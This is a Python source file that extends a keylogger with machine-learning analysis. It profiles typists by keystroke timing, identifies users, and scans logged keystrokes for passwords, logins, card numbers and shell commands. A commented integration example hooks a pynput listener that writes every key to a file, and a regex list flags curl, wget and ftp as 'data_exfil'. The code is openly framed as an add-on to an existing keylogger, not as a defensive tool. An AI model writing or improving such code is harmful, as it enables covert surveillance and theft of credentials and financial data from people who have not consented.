import numpy as np
import pandas as pd
from sklearn.cluster import KMeans
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler
import time
import json
from datetime import datetime

class KeyloggerML:
    def __init__(self, log_file="log.txt"):
        self.log_file = log_file
        self.typing_patterns = []
        self.user_profiles = {}
        self.current_session = {"keystrokes": [], "timestamps": [], "key_hold_times": []}
        
    def extract_features(self, raw_data):
        """Extract features from keystroke data"""
        # Example features:
        # - Average typing speed (characters per minute)
        # - Typing rhythm patterns
        # - Common key sequences
        # - Key hold duration
        features = {}
        
        if len(raw_data["timestamps"]) < 2:
            return None
            
        # Calculate typing speed
        total_time = raw_data["timestamps"][-1] - raw_data["timestamps"][0]
        char_count = len(raw_data["keystrokes"])
        if total_time > 0:
            features["typing_speed"] = (char_count / total_time) * 60
        else:
            features["typing_speed"] = 0
            
        # Calculate rhythm patterns (time between keystrokes)
        intervals = [raw_data["timestamps"][i+1] - raw_data["timestamps"][i] 
                    for i in range(len(raw_data["timestamps"])-1)]
        features["avg_interval"] = np.mean(intervals) if intervals else 0
        features["std_interval"] = np.std(intervals) if intervals else 0
        
        # Key hold duration
        features["avg_key_hold"] = np.mean(raw_data["key_hold_times"]) if raw_data["key_hold_times"] else 0
        
        # Calculate frequency of special keys
        text = ''.join(raw_data["keystrokes"])
        features["special_key_ratio"] = sum(1 for c in text if not c.isalnum()) / (len(text) if len(text) > 0 else 1)
        
        return features
        
    def preprocess_log(self):
        """Process the raw keylog file into structured data"""
        with open(self.log_file, 'r') as f:
            content = f.read()
            
        # Here you'd parse the log file and extract timestamps and keystrokes
        # Simplified example:
        structured_data = {
            "keystrokes": list(content),
            "timestamps": [time.time() - (len(content) - i) * 0.1 for i in range(len(content))],
            "key_hold_times": [0.05 + np.random.normal(0, 0.01) for _ in range(len(content))]
        }
        
        return structured_data
    
    def detect_anomalies(self, new_data):
        """Detect if keystroke pattern deviates from the normal profile"""
        if len(self.typing_patterns) < 10:
            print("Not enough data to establish a baseline pattern")
            return False
            
        # Convert typing patterns to a numpy array for model input
        X = np.array(self.typing_patterns)
        scaler = StandardScaler()
        X_scaled = scaler.fit_transform(X)
        
        # Train isolation forest for anomaly detection
        model = IsolationForest(contamination=0.05)
        model.fit(X_scaled)
        
        # Extract features from new data
        new_features = self.extract_features(new_data)
        if new_features is None:
            return False
            
        # Convert to proper format for prediction
        new_features_array = np.array([[
            new_features["typing_speed"],
            new_features["avg_interval"],
            new_features["std_interval"],
            new_features["avg_key_hold"],
            new_features["special_key_ratio"]
        ]])
        
        # Scale the new data using the same scaler
        new_features_scaled = scaler.transform(new_features_array)
        
        # Predict if it's an anomaly
        prediction = model.predict(new_features_scaled)
        
        # Return True if anomaly detected (prediction is -1)
        return prediction[0] == -1
    
    def identify_user(self, typing_data):
        """Attempt to identify the user based on typing patterns"""
        if len(self.user_profiles) < 2:
            print("Need at least two user profiles for identification")
            return None
            
        features = self.extract_features(typing_data)
        if features is None:
            return None
            
        min_distance = float('inf')
        identified_user = None
        
        # Simple distance-based identification
        for user, profile in self.user_profiles.items():
            distance = sum((features[key] - profile[key])**2 
                          for key in features if key in profile)
            
            if distance < min_distance:
                min_distance = distance
                identified_user = user
                
        return identified_user
    
    def add_user_profile(self, user_id, typing_data):
        """Add or update a user profile based on typing data"""
        features = self.extract_features(typing_data)
        if features:
            self.user_profiles[user_id] = features
            print(f"Profile updated for user {user_id}")
    
    def analyze_command_patterns(self, text):
        """Identify potential command patterns or sensitive information"""
        command_patterns = {
            "login": r"login|signin|username|password",
            "financial": r"credit.*card|bank|account.*number|\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}",
            "cmd_exec": r"cmd\.exe|powershell|bash|sudo|\.exe|\.sh",
            "data_exfil": r"ftp|curl|wget|upload|download|\.zip|\.tar|\.gz",
        }
        
        results = {}
        import re
        for category, pattern in command_patterns.items():
            if re.search(pattern, text, re.IGNORECASE):
                results[category] = True
        
        return results
        
    def on_key_press(self, key):
        """Record key press with timestamp"""
        # This would be integrated with your existing listener
        timestamp = time.time()
        self.current_session["keystrokes"].append(str(key))
        self.current_session["timestamps"].append(timestamp)
    
    def on_key_release(self, key):
        """Record key release for hold time calculation"""
        timestamp = time.time()
        if self.current_session["timestamps"]:
            press_time = self.current_session["timestamps"][-1]
            hold_time = timestamp - press_time
            self.current_session["key_hold_times"].append(hold_time)
    
    def run_analysis(self):
        """Main method to run analysis on collected data"""
        # In a real implementation, this would run periodically
        data = self.preprocess_log()
        features = self.extract_features(data)
        
        if features:
            self.typing_patterns.append([
                features["typing_speed"],
                features["avg_interval"],
                features["std_interval"],
                features["avg_key_hold"],
                features["special_key_ratio"]
            ])
            
            # Check for anomalies
            if self.detect_anomalies(data):
                print("⚠️ Anomaly detected in typing pattern!")
                
            # Try to identify user
            user = self.identify_user(data)
            if user:
                print(f"Identified user: {user}")
                
            # Analyze content for sensitive patterns
            text = ''.join(data["keystrokes"])
            patterns = self.analyze_command_patterns(text)
            if patterns:
                print(f"Detected patterns: {patterns}")
                
        # Save session data
        self.save_session_data()
    
    def save_session_data(self):
        """Save the session data for later analysis"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"session_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump({
                "typing_patterns": self.typing_patterns,
                "session_data": self.current_session
            }, f)
        
        print(f"Session data saved to {filename}")

# Example usage
if __name__ == "__main__":
    # This would be integrated with your existing keylogger
    ml_analyzer = KeyloggerML()
    
    # In a real implementation, you would:
    # 1. Hook this into your existing keylogger
    # 2. Run the analysis periodically or on session end
    # 3. Configure alerts for anomalous behavior
    
    # Integration example (conceptual):
    '''
    from pynput.keyboard import Listener
    
    def on_press(key):
        # Original keylogger functionality
        write_to_file(key)
        
        # ML enhancement
        ml_analyzer.on_key_press(key)
    
    def on_release(key):
        ml_analyzer.on_key_release(key)
        
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    '''
    
    # For demonstration, just run analysis on existing log
    ml_analyzer.run_analysis()
